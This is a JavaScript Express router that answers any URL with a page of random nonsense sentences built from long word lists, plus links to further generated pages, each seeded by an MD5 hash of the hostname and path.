var express = require('express');
var router = express.Router();

var MersenneTwister = require('mersenne-twister');
var generator = new MersenneTwister();

/* GET home page. */
// router.get('/', function(req, res, next) {
//   res.render('index', { title: 'Express' });
// });


// import { LoremIpsum } from 'lorem-ipsum';
const LoremIpsum = require('lorem-ipsum').LoremIpsum;

const lorem = new LoremIpsum({
  sentencesPerParagraph: {
    max: 8,
    min: 4
  },
  wordsPerSentence: {
    max: 16,
    min: 4
  }
});

function randomArticle() {
  var articles = ['a', 'the'];
  return articles[Math.floor(generator.random() * articles.length)];
}

function randomNoun() {
  var nouns = ['waste','increase','sky','horn','sweater','head','push','bell',
  'passenger','sock','mouth','ant','zoo','holiday','branch','snake','robin',
  'knife','part','throne','distribution','women','care','loaf','angle','sleep',
  'hose','steam','calendar','tub','veil','afterthought','fall','army',
  'daughter','place','beginner','advertisement','stream','truck','spade',
  'title','use','start','degree','fog','coach','ring','recess','flame','drain',
  'meal','question','rock','flag','action','yarn','umbrella','believe','dirt',
  'taste','salt','silk','chin','road','crook','substance','position','fly',
  'magic','direction','effect','design','girl','doctor','quartz','quince','cup',
  'wealth','idea','needle','alarm','library','car','slope','chance','machine',
  'range','pear','vessel','pin','attraction','error','wall','plant',
  'toothpaste','temper','vein','sort','detail','soap','bomb','cow','interest',
  'end','glove','price','afternoon','plot','cabbage','meat','history',
  'baseball','cub','purpose','room','move','jail','size','van','rice',
  'education','back','kettle','tooth','baby','cloth','sun','yard','sister',
  'teaching','measure','window','thought','plantation','frame','arithmetic',
  'theory','friction','rat','wind','spring','growth','cap','bulb','airplane',
  'front','attack','harmony','kiss','thrill','winter','offer','scent','zinc',
  'creature','hair','boat','notebook','wish','connection','grip','fairy',
  'color','line','volleyball','snail','man','territory','ocean','steel','death',
  'servant','ghost','structure','gold','lock','geese','parcel','distance',
  'shape','throat','market','amount','rail','deer','monkey','finger','dust',
  'wound','touch','top','governor','animal','hammer','society','reward','food',
  'day','silver','hate','punishment','bird','hook','love','plane','weight',
  'selection','wrench','bat','roof','bear','minister','shelf','ball','cake',
  'agreement','authority','balance','jar','look','chess','activity','icicle',
  'arm','eye','screw','mice','cheese','rhythm','existence','blow','school',
  'flight','office','note','wave','coast','middle','woman','bucket','invention',
  'flavor','jellyfish','profit','blood','jump','texture','camp','run',
  'vacation','gun','name','week','coil','property','example','unit','thread',
  'seashore','scarecrow','protest','son','join','metal','view','coat','thumb',
  'play','sea','oatmeal','tax','hat','sense','bag','comparison','cherry',
  'train','cart','friend','order','lunch','quicksand','bike','island','prose',
  'table','amusement','ray','badge','change','crow','guitar','competition',
  'word','wheel','exchange','scene','mist','orange','eggnog','rod','smoke',
  'floor','powder','company','jelly','clam','blade','crayon','water','plate',
  'mine','fear','farm','duck','cracker','pot','turkey','verse','apparatus',
  'canvas','pet','loss','hour','pipe','stone','kick','support','breath',
  'flower','drop','flesh','crowd','actor','plough','dinosaur','self','pull',
  'arch','judge','mitten','shoe','sheep','dime','government','thing','square',
  'credit','observation','belief','year','transport','sugar','teeth','industry',
  'wilderness','pail','wash','tin','button','appliance','decision','trick',
  'bubble','earthquake','produce','match','event','sneeze','horse','discovery',
  'record','vase','trail','fold','receipt','voyage','group','mountain','song',
  'quarter','box','grandmother','edge','men','tongue','cook','juice','curtain',
  'border','wrist','lumber','division','desk','rain','rabbit','bridge',
  'thunder','suit','dad','behavior','show','mind','yam','yoke','peace','month',
  'picture','value','celery','route','spoon','can','uncle','soda','stretch',
  'voice','shock','mother','harbor','dress','slip','insect','dock','kitten',
  'birthday','liquid','sand','boy','whip','surprise','basket','flock',
  'secretary','experience','control','quilt','hill','cast','corn','rub','act',
  'treatment','bit','vegetable','writing','chicken','mom','system','health',
  'face','crown','kitty','cattle','twig','trouble','church','lettuce','maid',
  'desire','swing','quiver','gate','meeting','birth','request','snow','honey',
  'spider','need','zebra','bed','wood','grape','night','tray','rifle','iron',
  'jewel','creator','stranger','coal','caption','circle','quiet','income',
  'crate','playground','guide','cobweb','side','ear','scarf','plastic','fowl',
  'sponge','stocking','bait','home','furniture','cat','statement','smell',
  'brick','shirt','crack','bite','railway','country','tomato','spy','nest',
  'turn','number','lace','achiever','aftermath','dinner','paper','force',
  'grass','sidewalk','tree','rate','yak','test','giraffe','time','humor',
  'trade','approval','letter','war','swim','work','visitor','point','locket',
  'toe','underwear','form','laugh','debt','elbow','tail','watch','cream',
  'sheet','station','carriage','river','street','addition','aunt','house',
  'book','representative','engine','hydrant','drink','ticket','copper','collar',
  'fireman','stew','grade','ship','pen','development','power','potato','beef',
  'fact','skate','wool','soup','respect','committee','pollution','stem','smile',
  'stove','grandfather','field','religion','cause','card','pest','bead','sound',
  'tank','hot','pig','heat','wire','minute','ice','straw','anger','fang',
  'zephyr','payment','foot','town','giant','summer','wine','air','stomach',
  'earth','twist','reason','base','cushion','pancake','fork','butter','string',
  'ink','poison','sail','crime','root','riddle','noise','walk','cent','page',
  'stick','rest','zipper','expert','tendency','lamp','destruction','knee',
  'seed','mint','egg','bedroom','memory','pizza','current','space','sofa',
  'hole','basketball','lip','money','partner','chalk','mark','step','crib',
  'whistle','stop','neck','rose','shame','instrument','level','quill','scale',
  'feeling','advice','leather','expansion','popcorn','relation','cemetery',
  'cable','porter','roll','channel','low','trip','leg','impulse','weather',
  'wren','worm','seat','brother','frog','cave','queen','door','boundary',
  'story','hall','ladybug','haircut','science','bush','bone','drawer','store',
  'hope','discussion','nose','toothbrush','sink','sack','marble','stage',
  'cannon','cellar','battle','spark','downtown','art','knowledge','nerve',
  'lake','pickle','camera','rake','talk','way','smash','language','suggestion',
  'star','hobby','fish','account','stitch','mailbox','tramp','calculator',
  'squirrel','wax','cough','laborer','board','vest','fuel','dog','bath','brass',
  'muscle','nation','airport','carpenter','insurance','pan','brake','donkey',
  'reading','linen','mass','burst','spot','clover','key','building','sign',
  'cover','doll','finger','land','mask','north','business','bee','nut','ground',
  'hospital','writer','class','fire','argument','shop','milk','glass','toad',
  'curve','limit','basin','lunchroom','rule','adjustment','pie','tiger','boot',
  'jam','shade','fruit','pump','moon','pencil','pocket','reaction','condition',
  'rainstorm','apparel','regret','pleasure','wing','cactus','children','skirt',
  'person','stamp','knot','oil','oven','berry','toy','party','baby','team',
  'motion','digestion','sleet','grain','driving','club','skin','tent','volcano',
  'morning','bottle','shake'];
  return nouns[Math.floor(generator.random() * nouns.length)];
}

function randomVerb() {
  var verbs = ['prays','sprouts','opens','plants','shades','signals','shivers',
  'hooks','lies','borrows','punctures','wishes','arrives','watches','hands',
  'greets','informs','harasses','crushes','wants','cries','winks','cheats',
  'repairs','numbers','undresses','kneels','admits','matches','contains',
  'laughs','misses','tires','lives','drips','admires','moors','competes',
  'scribbles','invites','examines','pops','polishes','checks','lands','straps',
  'rains','covers','stares','taps','announces','ticks','interrupts','sprays',
  'decays','preaches','spoils','heats','shares','tricks','boils','satisfies',
  'precedes','shops','coughs','peels','closes','breathes','scrubs','marries',
  'extends','sucks','explodes','prepares','knots','tows','longs','arranges',
  'cares','risks','explains','attempts','rejoices','jogs','jumps','trips',
  'trusts','helps','flows','milks','carves','records','strokes','blushes',
  'fancies','frames','twists','possesses','tickles','murders','increases',
  'appears','realizes','spots','bombs','gathers','bleaches','guards','observes',
  'trembles','prints','grabs','chokes','deceives','embarrasses','entertains',
  'returns','raises','skis','films','likes','whispers','paints','groans','pats',
  'appreciates','hovers','telephones','rhymes','greases','folds','phones',
  'suggests','rushes','unites','notices','pines','reflects','ruins','avoids',
  'knits','dusts','locks','introduces','traps','pedals','slaps','brakes',
  'shocks','files','offers','glows','untidies','squeals','sounds','talks',
  'zooms','slips','follows','bathes','lasts','applauds','licenses','orders',
  'parts','pours','instructs','communicates','prefers','waters','bakes','waves',
  'wanders','nails','fences','consists','dries','looks','matters','ignores',
  'coils','includes','expects','turns','reproduces','bows','books','nests',
  'lightens','crashes','guarantees','radiates','attaches','sighs','faxes',
  'mixes','corrects','yells','apologizes','settles','yawns','dislikes','peeps',
  'touches','attacks','coaches','squashes','impresses','rules','bolts',
  'rescues','bans','bores','knocks','succeeds','pastes','marches','regrets',
  'agrees','spells','connects','licks','smells','sacks','whirls','provides',
  'offends','wipes','copies','welcomes','happens','moves','intends','serves',
  'tries','rots','fills','trains','fires','disarms','sins','retires','presents',
  'jams','guesses','harms','wrecks','stops','scolds','concentrates','wails',
  'kisses','grates','receives','tames','traces','wastes','saws','calls',
  'excites','buzzes','dresses','glues','improves','hangs','bares','arrests',
  'measures','drains','skips','fixes','invents','changes','mourns','grins',
  'rejects','injures','detects','tests','rolls','analyzes','mans','stains',
  'fetches','sips','spares','levels','loads','blots','replies','encourages',
  'confuses','pinches','frightens','discovers','listens','attracts','waits',
  'heaps','permits','buries','continues','remembers','combs','relies','suffers',
  'muddles','whines','cracks','joins','calculates','crawls','vanishes',
  'supports','jails','reports','deserves','slows','warms','jokes','surprises',
  'judges','tips','belongs','removes','beams','wrestles','battles','packs',
  'spills','backs','dares','delivers','imagines','shaves','wraps','damages',
  'squeaks','fears','challenges','doubts','advises','fastens','pretends',
  'completes','empties','camps','sparks','travels','owes','scares','attends',
  'employs','thaws','hops','rocks','irritates','blesses','signs','performs',
  'tempts','compares','sails','drags','scatters','thanks','enters','pokes',
  'smokes','tours','multiplies','owns','counts','enjoys','fools','considers',
  'hates','pecks','expands','races','stuffs','punches','seals','snores',
  'commands','suspects','annoys','destroys','rubs','tugs','delays','produces',
  'overflows','drums','bumps','answers','soaks','branches','posts','decides',
  'pulls','doubles','smiles','loves','trots','shrugs','mends','chops','manages',
  'flashes','interests','shelters','forms','grips','reminds','unlocks',
  'escapes','haunts','reigns','pushes','hunts','sparkles','tastes','itches',
  'places','fries','terrifies','stitches','robs','relaxes','hammers','hopes',
  'affords','reaches','flaps','injects','confesses','fits','stirs','bounces',
  'describes','ends','steps','sniffs','faces','floats','boasts','excuses',
  'surrounds','carries','burns','curves','promises','drowns','nods','mines',
  'lists','obtains','crosses','steers','begs','practices','clips','cheers',
  'repeats','argues','smashes','accepts','claps','meddles','obeys','punishes',
  'depends','queues','labels','stays','mess ups','scorches','prevents','adds',
  'notes','disapproves','interferes','points','snows','cures','fades','screams',
  'moans','stamps','drops','parks','collects','delights','replaces','x-rays',
  'refuses','gazes','chases','bruises','times','founds','types','reduces',
  'deserts','kills','strengthens','unpacks','protects','dams','wonders',
  'guides','pleases','scratches','tumbles','mugs','trades','behaves','paddles',
  'claims','washes','bats','soothes','searches','programs','objects','hugs',
  'allows','colors','saves','remains','forces','zips','pricks','separates',
  'disagrees','floods','squeezes','supposes','starts','juggles','charges',
  'plans','visits','screws','needs','kicks','whistles','requests','weighs',
  'whips','chews','suspends','strips','clears','exercises','treats','wobbles',
  'bangs','preserves','unfastens','passes','stores','cycles','flowers','plugs',
  'memorizes','alerts','cleans','handles','develops','fails','asks','curls',
  'launches','warns','dances','educates','brushes','works','concerns','scrapes',
  'complains','melts','learns','boxes','hums','heals','rinses','hurries',
  'marks','transports','releases','occurs','wriggles','amuses','blinks',
  'bubbles','recognizes','presses','pumps','switches','decorates','worries',
  'dreams','picks','disappears','divides','names','blinds','walks','snatches',
  'earns','approves','pauses','identifies','troubles','mates','questions',
  'stretches','suits','balances','uses','supplies','plays','sneezes',
  'subtracts','exists','causes','heads','ties','teases','influences'];
  return verbs[Math.floor(generator.random() * verbs.length)];
}

function randomAjective() {
  var adjectives = ['hushed','teeny-tiny','decisive','long-term','alcoholic',
  'alleged','ragged','discreet','ill','devilish','scintillating','furtive',
  'unable','honorable','valuable','longing','half','wretched','amused',
  'foolish','military','statuesque','waggish','tame','mean','racial',
  'sweltering','quick','foamy','uttermost','second-hand','lively','sweet',
  'limping','ugliest','chunky','lavish','blue','victorious','uppity','unbiased',
  'hypnotic','squalid','eatable','quizzical','unwritten','aspiring','hilarious',
  'obtainable','mere','massive','opposite','educated','dusty','sore','zealous',
  'mute','kaput','peaceful','tasteful','bawdy','humorous','roomy','irate',
  'classy','gorgeous','adaptable','smooth','volatile','capable','amuck',
  'wistful','tasteless','industrious','profuse','hellish','quixotic',
  'panoramic','damaging','mellow','extra-large','spectacular','splendid',
  'abaft','daffy','daily','ten','known','adjoining','torpid','misty','ahead',
  'gratis','abrupt','economic','scarce','certain','faded','evasive','unnatural',
  'grumpy','bouncy','spurious','sneaky','erect','unknown','frightening',
  'cluttered','defiant','warm','nippy','imaginary','hapless','past','various',
  'hot','dapper','disillusioned','spooky','thirsty','protective','obnoxious',
  'husky','seemly','open','hesitant','third','fantastic','nebulous','sore',
  'divergent','tacky','normal','far','rude','dear','quaint','great','mushy',
  'roasted','fluttering','juicy','rough','worried','courageous','trashy',
  'fascinated','abusive','vulgar','scandalous','bewildered','next','scattered',
  'cumbersome','gigantic','gentle','symptomatic','purring','first','precious',
  'ablaze','six','elegant','lowly','obeisant','fumbling','sharp','dispensable',
  'languid','garrulous','kindly','spotless','noisy','feigned','aromatic','huge',
  'vague','loutish','abrasive','insidious','helpless','overconfident','green',
  'unsuitable','motionless','maniacal','axiomatic','absorbed','charming',
  'waiting','ignorant','wet','supreme','puzzled','abhorrent','false','needy',
  'impartial','outstanding','clean','invincible','flippant','adventurous',
  'impolite','famous','spotty','ambitious','faithful','utopian','picayune',
  'vivacious','rare','plucky','bored','sad','painstaking','shaggy','strange',
  'broad','deeply','different','lovely','proud','rustic','absent','dead',
  'foregoing','delicate','erratic','possessive','tacit','earthy','hulking',
  'sloppy','dirty','overjoyed','yummy','obscene','acid','deserted','unruly',
  'cuddly','macabre','versed','obsequious','recondite','stormy','selfish',
  'harsh','bright','tranquil','woebegone','tasty','silky','hurt','squeamish',
  'savory','mountainous','slimy','icy','lively','distinct','secretive',
  'wasteful','lumpy','orange','four','rainy','far-flung','exotic','brown',
  'important','wary','magnificent','thankful','intelligent','elated',
  'unsightly','level','truculent','befitting','used','shaky','nine','perpetual',
  'attractive','grandiose','afraid','oafish','jobless','guiltless','dizzy',
  'polite','detailed','madly','awake','amusing','outrageous','ill-informed',
  'colorful','difficult','coordinated','harmonious','makeshift','wrathful',
  'inexpensive','agreeable','smoggy','premium','jealous','knowledgeable',
  'common','incandescent','lyrical','dramatic','zesty','sudden','belligerent',
  'cagey','exciting','tearful','acceptable','elfin','nutritious','disastrous',
  'greedy','unusual','threatening','glamorous','curved','gamy','accurate',
  'magenta','highfalutin','previous','equal','craven','utter','adhesive',
  'shocking','well-groomed','laughable','oval','tan','able','black','medical',
  'resolute','fixed','dazzling','demonic','ambiguous','expensive','hideous',
  'pretty','loud','acrid','wiggly','neat','aggressive','tall','noiseless',
  'aware','anxious','free','optimal','cloudy','terrible','holistic','loving',
  'melodic','full','aboard','merciful','astonishing','aberrant','gainful',
  'spiffy','outgoing','onerous','bashful','aboriginal','testy','thin','perfect',
  'wandering','crowded','two','fluffy','needless','standing','swanky','shy',
  'angry','big','receptive','calculating','drunk','broken','prickly','best',
  'functional','sable','melted','cute','wide','phobic','mysterious',
  'delightful','vacuous','rotten','trite','private','defective','poised',
  'rampant','useless','coherent','shut','tight','lewd','cautious','cut',
  'wanting','healthy','keen','unequaled','addicted','ajar','narrow','itchy',
  'lopsided','stingy','undesirable','real','shallow','tested','ritzy','short',
  'hungry','hallowed','sincere','graceful','psychotic','defeated','puny',
  'curious','wry','one','super','cold','subsequent','exultant','soggy','tough',
  'envious','gifted','crazy','sordid','last','awful','aquatic','faint','icky',
  'dangerous','labored','small','cooperative','offbeat','hateful','concerned',
  'gaudy','cynical','fancy','abundant','heady','illegal','absorbing','fast',
  'wide-eyed','empty','lamentable','dull','secret','combative','heavy',
  'selective','tidy','ordinary','wiry','glorious','upset','womanly','ready',
  'grubby','enormous','unadvised','wicked','superb','political','long','young',
  'flashy','unhealthy','uptight','pumped','tiny','male','verdant','ad hoc',
  'imported','average','blushing','quickest','auspicious','unkempt','fearful',
  'frantic','eight','petite','modern','direful','clammy','raspy','toothsome',
  'resonant','childlike','shivering','witty','ripe','cute','swift',
  'lackadaisical','regular','meek','pointless','adamant','numberless','stupid',
  'excellent','grateful','bitter','glistening','fuzzy','joyous','illustrious',
  'handsomely','jaded','electric','talented','earsplitting','temporary','tense',
  'jazzy','annoyed','gusty','fabulous','flowery','remarkable','pleasant',
  'pushy','scrawny','impossible','imperfect','innocent','clear','cheerful',
  'irritating','stale','interesting','skinny','necessary','handsome',
  'agonizing','animated','nice','tender','omniscient','pale','infamous','lazy',
  'billowy','painful','rural','righteous','creepy','odd','cheap','round',
  'disgusted','abandoned','thinkable','screeching','draconian','scientific',
  'responsible','ancient','steadfast','workable','macho','lethal','early',
  'penitent','marked','freezing','deafening','wise','red','dashing','moldy',
  'happy','ethereal','noxious','kindhearted','smart','cool','nauseating',
  'light','rich','curvy','inquisitive','watery','future','flawless','parallel',
  'fertile','faulty','judicious','gaping','beautiful','minor','chilly',
  'annoying','pastoral','voiceless','mixed','cultured','busy','well-off',
  'amazing','willing','berserk','thundering','robust','spicy','present',
  'uncovered','nervous','deep','obedient','beneficial','messy','nosy',
  'succinct','serious','bite-sized','incompetent','muddled','homeless',
  'evanescent','even','venomous','energetic','well-made','low',
  'black-and-white','assorted','handy','boiling','parched','fine','reminiscent',
  'vast','clumsy','scary','little','jolly','groovy','ultra','lacking',
  'descriptive','futuristic','festive','idiotic','colossal','fair','fierce',
  'crooked','efficacious','fragile','capricious','royal','tired','eager',
  'piquant','productive','majestic','damaged','enthusiastic','synonymous',
  'glossy','nonchalant','observant','filthy','yielding','tricky','fallacious',
  'troubled','excited','strong','uneven','repulsive','magical','miscreant',
  'probable','skillful','ruddy','abounding','complete','homely','nasty',
  'habitual','near','zany','knowing','jumbled','lonely','good','elastic',
  'frail','brawny','acidic','wrong','materialistic','slow','stimulating',
  'high-pitched','spotted','unused','goofy','pathetic','periodic','quarrelsome',
  'unbecoming','eminent','panicky','determined','measly','slim','funny',
  'unwieldy','loose','alluring','sulky','nostalgic','ratty','alive',
  'rambunctious','giddy','chubby','heavenly','damp','embarrassed','elderly',
  'worthless','towering','arrogant','delirious','comfortable','spiky',
  'truthful','oceanic','grieving','careless','wacky','vigorous','knotty',
  'abashed','actually','dusty','romantic','female','cooing','steady',
  'therapeutic','decorous','rightful','debonair','typical','rabid','historical',
  'abnormal','natural','ruthless','ossified','relieved','friendly','old',
  'imminent','burly','whimsical','questionable','sassy','hard-to-find','null',
  'abject','glib','bizarre','frightened','sick','tremendous','legal','useful',
  'shiny','successful','living','bad','equable','plant','sleepy','forgetful',
  'overrated','wealthy','right','tawdry','terrific','depressed','tangible',
  'greasy','boorish','smelly','smiling','fortunate','cowardly','overt',
  'efficient','quirky','dynamic','weary','permissible','nimble','quack',
  'breezy','telling','alert','silent','maddening','taboo','tense','youthful',
  'domineering','rapid','grey','windy','chief','brash','naive','exuberant',
  'changeable','quiet','second','condemned','reflective','marvelous','teeny',
  'grouchy','extra-small','slippery','true','steep','encouraging','lean',
  'hollow','zonked','accidental','special','chivalrous','closed','innate',
  'psychedelic','endurable','dependent','learned','spiritual','fresh','puffy',
  'flagrant','alike','horrible','nutty','subdued','square','new','barbarous',
  'literate','unique','pricey','pink','moaning','frequent','poor','silly',
  'dreary','unaccountable','cloistered','dysfunctional','fanatical','wild',
  'striped','disturbed','brainy','entertaining','ugly','aback','guttural',
  'caring','bustling','confused','careful','spiteful','grotesque',
  'sophisticated','scared','gabby','jittery','bright','miniature','jagged',
  'unarmed','bumpy','simple','ubiquitous','nappy','old-fashioned','paltry',
  'staking','ludicrous','whole','upbeat','salty','organic','satisfying',
  'violent','tenuous','thoughtless','dark','woozy','public','hurried',
  'delicious','apathetic','abstracted','finicky','fearless','ashamed',
  'available','boring','disgusting','thoughtful','disagreeable','parsimonious',
  'brief','overwrought','better','plausible','enchanting','numerous','thick',
  'simplistic','safe','high','deranged','rhetorical','dry','curly','hanging',
  'like','callous','conscious','wonderful','hard','automatic','mindless',
  'guarded','abiding','soft','godly','neighborly','acoustic','substantial',
  'sturdy','left','well-to-do','instinctive','redundant','familiar','hissing',
  'deadpan','awesome','murky'];
  return adjectives[Math.floor(generator.random() * adjectives.length)];
}

function randomAdverb() {
  var adverbs = ['dimly','acidly','potentially','judgementally','fervently',
  'lively','deeply','beautifully','devotedly','yesterday','tenderly',
  'tensely','boastfully','carefully','upward','queasily','basically',
  'playfully','gladly','painfully','well','then','generally','tightly',
  'hungrily','truthfully','bleakly','scarily','sometimes','recently','rigidly',
  'automatically','jealously','energetically','cruelly','madly','irritably',
  'never','calmly','kindheartedly','solemnly','dearly','elegantly','primarily',
  'widely','wearily','righteously','briefly','smoothly','similarly','even',
  'oddly','steadily','anyway','voluntarily','angrily','greatly','sleepily',
  'lightly','powerfully','crazily','frantically','lovingly','promptly','wholly',
  'foolishly','arrogantly','frenetically','queerly','slowly','coyly','weekly',
  'joyously','previously','boldly','hastily','surprisingly','punctually',
  'weakly','thus','noisily','excitedly','enormously','interestingly','slightly',
  'sheepishly','wonderfully','blindly','helplessly','moreover','triumphantly',
  'kindly','valiantly','tomorrow','normally','questioningly','more','kissingly',
  'quarrelsomely','recklessly','ahead','safely','deceivingly','loudly',
  'violently','unnecessarily','bitterly','usually','nervously','dutifully',
  'inquisitively','worriedly','famously','far','delightfully','zealously',
  'crossly','directly','unnaturally','unfortunately','daily','often','however',
  'yearly','possibly','twice','youthfully','utterly','intensely','fiercely',
  'needily','gleefully','else','warmly','merely','searchingly','very',
  'yawningly','partially','softly','sympathetically','separately','joyfully',
  'unabashedly','sharply','somewhat','reassuringly','zestfully','rudely',
  'vacantly','suddenly','personally','unaccountably','quizzically',
  'mechanically','knottily','freely','vaguely','viciously','mortally','below',
  'sternly','neatly','heavily','loyally','jaggedly','technically','carelessly',
  'early','again','adventurously','swiftly','verbally','likely','correctly',
  'strongly','jovially','questionably','kookily','seriously','yearningly',
  'frankly','altogether','nicely','awkwardly','stealthily','regularly',
  'unbearably','yieldingly','happily','brightly','specifically','uselessly',
  'fairly','wetly','immediately','shakily','significantly','always','zestily',
  'monthly','blissfully','scarcely','solidly','accidentally','upbeat',
  'reluctantly','certainly','majestically','knowingly','simply','terribly',
  'patiently','optimistically','mainly','wildly','doubtfully','knowledgeably',
  'longingly','seemingly','vivaciously','colorfully','fast','extremely',
  'dramatically','bashfully','loftily','offensively','quicker','upside-down',
  'forth','cautiously','originally','coaxingly','mysteriously','broadly',
  'deftly','curiously','everywhere','vastly','inwardly','ever','fortunately',
  'obediently','instead','urgently','intently','mostly','thoughtfully',
  'necessarily','silently','upliftingly','rapidly','innocently','currently',
  'virtually','keenly','defiantly','loosely','gratefully','commonly',
  'faithfully','fatally','gently','definitely','unimpressively','quaintly',
  'hourly','actually','rather','quirkily','only','really','initially','briskly',
  'ferociously','seldom','afterwards','reproachfully','upwardly','frightfully',
  'relatively','selfishly','together','totally','evenly','not','owlishly',
  'mockingly','naturally','probably','enthusiastically','also','continually',
  'properly','dreamily','cheerfully','knavishly','finally','generously',
  'woefully','sedately','quietly','gracefully','nearly','exactly',
  'suspiciously','willfully','kiddingly','frequently','repeatedly','strictly',
  'roughly','absentmindedly','sweetly','soon','highly','fully','politely',
  'bravely','joshingly','wrongly','daintily','tediously','wisely','greedily',
  'equally','justly','sadly','honestly','victoriously','merrily','hopefully',
  'hopelessly','rarely','closely','especially','obnoxiously','easily',
  'thoroughly','ultimately','quickly','literally','too','furiously','restfully',
  'abnormally','completely','speedily','unexpectedly','anxiously',
  'successfully','lazily','tremendously','hardly','elsewhere','annually',
  'deliberately','upright','shyly','diligently','coolly','healthily',
  'unethically','almost','poorly','thankfully','therefore','already','truly',
  'instantly','essentially','overconfidently','busily','constantly',
  'rightfully','perfectly','shrilly','openly','eventually','effectively',
  'courageously','jubilantly','fondly','positively','officially','physically',
  'vainly','miserably','helpfully','clearly','readily','terrifically',
  'usefully','eagerly','less','meaningfully','occasionally','limply','badly',
  'cleverly'];
  return adverbs[Math.floor(generator.random() * adverbs.length)];
}

function aToAnIfNeeded(sentence) {
  if (sentence.match(/^a [aeiou]/) || sentence.match(/^a hour/)) {
    return sentence.replace(/^a/, 'an');
  }
  return sentence
}

function sentenceA(seed) {
  return aToAnIfNeeded([randomArticle(seed++),randomNoun(seed++),randomVerb(seed++)].join(' '));
}

function sentenceB(seed) {
  return aToAnIfNeeded([randomArticle(seed++),randomAjective(seed++),randomNoun(seed++),randomVerb(seed++)].join(' '));
}

function sentenceC(seed) {
  return aToAnIfNeeded([randomArticle(seed++),randomNoun(seed++),randomAdverb(seed++),randomVerb(seed++)].join(' '));
}

function sentenceD(seed) {
  return aToAnIfNeeded([randomArticle(seed++),randomAjective(seed++),randomNoun(seed++),randomAdverb(seed++),randomVerb(seed++)].join(' '));
}

function sentenceE(seed) {
  sentences = [sentenceA, sentenceB, sentenceC, sentenceD];
  return sentences[Math.floor(generator.random() * sentences.length)](seed++) +
  ' because ' + sentences[Math.floor(generator.random() * sentences.length)](10 + seed++);
}

function sentenceF(seed) {
  sentences = [sentenceA, sentenceB, sentenceC, sentenceD];
  return sentences[Math.floor(generator.random() * sentences.length)](seed++) +
  ' when ' + sentences[Math.floor(generator.random() * sentences.length)](10 + seed++);
}

function sentenceG(seed) {
  sentences = [sentenceA, sentenceB, sentenceC, sentenceD];
  return sentences[Math.floor(generator.random() * sentences.length)](seed++) +
  ' though ' + sentences[Math.floor(generator.random() * sentences.length)](10 + seed++);
}

function sentenceH(seed) {
  sentences = [sentenceA, sentenceB, sentenceC, sentenceD];
  return sentences[Math.floor(generator.random() * sentences.length)](seed++) +
  ' while ' + sentences[Math.floor(generator.random() * sentences.length)](10 + seed++);
}

function sentenceI(seed) {
  sentences = [sentenceA, sentenceB, sentenceC, sentenceD];
  return sentences[Math.floor(generator.random() * sentences.length)](seed++) +
  ', and ' + sentences[Math.floor(generator.random() * sentences.length)](10 + seed++);
}

function sentenceJ(seed) {
  sentences = [sentenceA, sentenceB, sentenceC, sentenceD];
  return sentences[Math.floor(generator.random() * sentences.length)](seed++) +
  ', but ' + sentences[Math.floor(generator.random() * sentences.length)](10 + seed++);
}

function sentenceK(seed) {
  sentences = [sentenceA, sentenceB, sentenceC, sentenceD];
  return sentences[Math.floor(generator.random() * sentences.length)](seed++) +
  ', so ' + sentences[Math.floor(generator.random() * sentences.length)](10 + seed++);
}

function sentenceL(seed) {
  sentences = [sentenceA, sentenceB, sentenceC, sentenceD];
  return sentences[Math.floor(generator.random() * sentences.length)](seed++) +
  ', after ' + sentences[Math.floor(generator.random() * sentences.length)](10 + seed++);
}

function sentenceM(seed) {
  sentences = [sentenceA, sentenceB, sentenceC, sentenceD];
  return sentences[Math.floor(generator.random() * sentences.length)](seed++) +
  ', before ' + sentences[Math.floor(generator.random() * sentences.length)](10 + seed++);
}

function randomSentence(seed) {
  sentences = [sentenceA, sentenceB, sentenceC, sentenceD, sentenceE, sentenceF,
     sentenceG, sentenceH, sentenceI, sentenceJ, sentenceK, sentenceL, sentenceM];
  sentence = sentences[Math.floor(generator.random() * sentences.length)](seed++);
  return sentence.charAt(0).toUpperCase() + sentence.slice(1);
  // return 'seed: ' + seed + '.';
}

function randomTitle(seed) {
  return randomSentence(seed);
}

function randomParagraph(seed) {
  var sentences = 4 + Math.floor(generator.random() * 5);
  var paragraph = [];
  for (var i = 0; i < sentences; i++) {
    paragraph[i] = randomSentence(seed + i * 100);
  }
  return paragraph.join('. ') + '.';
}

function randomParagraphs(seed) {
  var paragraphs = 5 + Math.floor(generator.random() * 100);
  var article = [];
  for (var i = 0; i < paragraphs; i++) {
    article[i] = randomParagraph(seed + i * 1000);
  }
  return article;
}

function randomLink(seed, hostname) {
  var link = [];
  link['href'] = '/' + randomSentence(seed).replace(/ /g, '/').replace(/,/g, '');
  var linkSeed = generateSeed(hostname + link['href']);
  link['title'] = randomTitle(linkSeed);
  return link;
}

function randomLinks(seed, hostname) {
  var generator = new MersenneTwister(seed+10000);
  var linkCount = 5 + Math.floor(generator.random() * 10);
  var links = [];
  for (var i = 0; i < linkCount; i++) {
    links[i] = randomLink(seed + i * 10000, hostname);
  }
  return links;
}

function generateSeed(path) {
  var md5 = require('md5');
  var sum = md5(path);
  var seed = parseInt(sum.slice(0,7),16) + parseInt(sum.slice(8,15),16) + parseInt(sum.slice(16,23),16) + parseInt(sum.slice(24,31),16);
  return seed;
}

function randomPage(req, res) {
  var seed = generateSeed(req.hostname + req.path);

  var title = randomTitle(seed);
  var paragraphs = randomParagraphs(seed);
  var links = randomLinks(seed, req.hostname);

  res.render('random', {title: title, paragraphs: paragraphs, links: links});
}

router.all('*', randomPage);

// console.log(lorem.generateParagraphs(7));

// var paragraphs = [];
// for (var i = 0; i < 7; i++) {
//   paragraphs[i] = lorem.generateParagraphs(1);
// }
//
// var title = lorem.generateSentences(1);

// router.all('*', (req, res) => res.render('random', {title: title, paragraphs: paragraphs} ) )

// router.get('/', (req, res) => res.send(lorem.generateParagraphs(7)))

